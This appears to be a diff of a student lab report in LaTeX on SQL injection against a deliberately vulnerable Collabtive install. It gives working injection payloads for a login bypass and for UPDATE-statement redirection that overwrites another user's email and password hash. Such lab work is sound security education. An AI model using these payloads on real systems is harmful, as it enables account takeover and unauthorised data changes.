@@ -45,10 +45,10 @@ AND password = '' OR '1' == '1'"
 
 The above query in fact asks the database to "find the user ID whose username is 'admin' and \emph{either} (1) their password is empty \emph{or} (2) one is equal to one". Obviously one is always equal to one, so the query simply logs the user in as admin without the password check. This is a simple example of an SQL injection - data from the user being interpreted as part of a valid SQL statement, resulting in unpredicted and often malicious behaviour. SQL injections can also be used to gain confidential information from the database, or to find another vulnerability to attack. In reality, there are several obstacles when executing such attack. More on realistic circumstances and defences will be discussed in Task 3 and the following reflective report.
 
-In Tasks 1 and 2, the \emph{magic\_quotes\_gpc} option is turned off in the php.ini file for illustration purposes. This prevents php from automatically escaping character sequences in variables received from website forms. In this lab we focus on the file /var/www/SQL/Collabtive/include/class.user.php, which is responsible for querying the database and checking the password when a user attempts a login.
+In this lab we focus on the file /var/www/SQL/Collabtive/include/class.user.php, which is responsible for querying the database and checking the password when a user attempts a login. In Tasks 1 and 2, the \emph{magic\_quotes\_gpc} option is turned off in the php.ini file for illustration purposes. This prevents php from automatically escaping character sequences in variables received from website forms. Note that in the following code snippets, if the \emph{\$user} or the \emph{\$pass} variables are directly set, it actually means entering them through the web login form.
 
-\subsection{Task 1 - Injection on the login form}
-\subsubsection{Part 1 - Bypassing hashed password}
+\subsection{Task 1 - Injection on the login form} \label{l4_t1}
+\subsubsection{Part 1 - Bypassing hashed password} \label{l4_t1p1}
 In this subtask, the submitted password string is first hashed using SHA-1 (see code in \lstref{lst:l4_t1p1_vulnstm}). This means the attack given in Section \ref{l4_ctx} would fail. The resultant query string of the same attack is shown in \lstref{lst:l4_t1p1_failatk}, which shows a string of gibberish that is just data for the query.
 
 \begin{minipage}{\linewidth}
@@ -112,8 +112,73 @@ WHERE name = 'admin'; #"
 \end{lstlisting}
 \end{minipage}
 
-This fails, because the php script calls \emph{mysql\_query()}, which executes only the first query. However, if the php script had called \emph{mysqli::multi\_query}, then the same attack could work.
+This fails, because the php script calls \emph{mysql\_query()}, which executes only the first query. However, if the php script had called \emph{mysqli::multi\_query()}, then this injection could work.
 
 \subsection{Task 2 - Injection on UPDATE}
+\subsubsection{Part 1 - Change Bob's email} \label{l4_t2p1}
+In this subtask, we first compromise Peter's account using the same attack as in Section \ref{l4_t1p1}, and navigate to the Edit User page (end of URL is "manageuser.php?action=editform\&id=5"). This edit page has many text fields. By examining the php script, we see that all text fields had their contents escaped using \emph{mysql\_real\_escape\_string()}, except the company field. This means we can inject some SQL into the company field, which is part of an UPDATE statement:
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={UPDATE statement from the edit form},
+label={lst:l4_t1p2_updq},
+frame=single]
+"UPDATE user SET name='$name',email='$email',
+tel1='$tel1', tel2='$tel2',company='$company',
+zip='$zip',gender='$gender',url='$url',
+adress='$address1',adress2='$address2',
+state='$state',country='$country',tags='$tags',
+locale='$locale',avatar='$avatar',rate='$rate'
+WHERE ID = $id"
+\end{lstlisting}
+\end{minipage}
+
+Using the same logic as in Section \ref{l4_t1p1}, we can set Bob's email by injection a new search criteria and ignore the rest of the query:
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={UPDATE statement redirection},
+label={lst:l4_t1p2_compatk},
+frame=single]
+$company = "' WHERE name = 'bob'#"
+\end{lstlisting}
+\end{minipage}
+
+With \lstref{lst:l4_t1p2_compatk}, we can redirect the UPDATE query to any user with a known name. In order to change Bob's email, we simply enter a new email in the email field. In addition, since the query also updates the name field, we must enter Bob's name instead.
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Email overwrite expansion},
+label={lst:l4_t1p2_compatkres},
+frame=single]
+"UPDATE user SET name='bob',email='peter@evil.com',tel1='', tel2='',
+company='' WHERE name = 'bob'#',
+zip='',gender='',url='',adress='',adress2='',state='',
+country='',tags='',locale='',rate='0' WHERE ID = 5"
+\end{lstlisting}
+\end{minipage}
+
+\subsubsection{Part 2 - Change Bob's password}
+Changing Bob's password is less straightforward as the password itself is stored as a hash. In order to give Bob's password a new value, we must first encode the new password using SHA-1. If the new password is "peter", then the hash would be "4b8373d016f277527198385ba72fda0feb5da015".
+
+After obtaining the new password hash, we apply an injection similar to Section \ref{l4_t2p1}. Instead of putting the hash in the actual password fields, we embed the value pair in the injection. This is because in order for the redirection to work, the real search criteria (WHERE ID = 5) must be commented out. Doing so comes with a price of having to comment out all value pairs before the real search critera up to our new, fake search criteria (name = 'bob'). We therefore arrive at \lstref{lst:l4_t1p2_pwdatk} and hence \lstref{lst:l4_t1p2_pwdatkres}.
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Password overwrite injection},
+label={lst:l4_t1p2_pwdatk},
+frame=single]
+$company = "', pass='4b8373d016f277527198385ba72fda0feb5da015'
+               WHERE name = 'bob'#"
+\end{lstlisting}
+\end{minipage}
+
+\begin{minipage}{\linewidth}
+\begin{lstlisting}[caption={Password overwrite expansion},
+label={lst:l4_t1p2_pwdatkres},
+frame=single]
+"UPDATE user SET name='bob',email='peter@evil.com',tel1='',tel2='',
+company='', pass='4b8373d016f277527198385ba72fda0feb5da015'
+WHERE name = 'bob'#',
+zip='',gender='',url='',adress='',adress2='',
+state='',country='',tags='',locale='',rate='0' WHERE ID = 5"
+\end{lstlisting}
+\end{minipage}
 
 \subsection{Task 3 - Countermeasures}
